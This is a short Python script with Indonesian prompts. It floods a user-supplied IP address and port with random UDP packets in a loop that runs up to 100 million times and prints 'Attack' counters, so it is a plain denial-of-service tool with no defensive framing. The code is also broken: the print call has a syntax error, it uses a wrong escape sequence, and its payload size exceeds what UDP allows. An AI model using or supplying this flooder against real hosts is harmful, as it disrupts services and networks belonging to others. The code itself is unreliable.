import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input('Masukan IP Target : ')
port = int(input('Masukan Port Target : '))
sleep = float(input('Sleep : '))

s.connect((ip,port))

for i in range (1, 1000*100000):
  s.send(random._urandom(100)*100000)
  print(f"Attack {i}" end="/r")
  time.sleep(sleep)
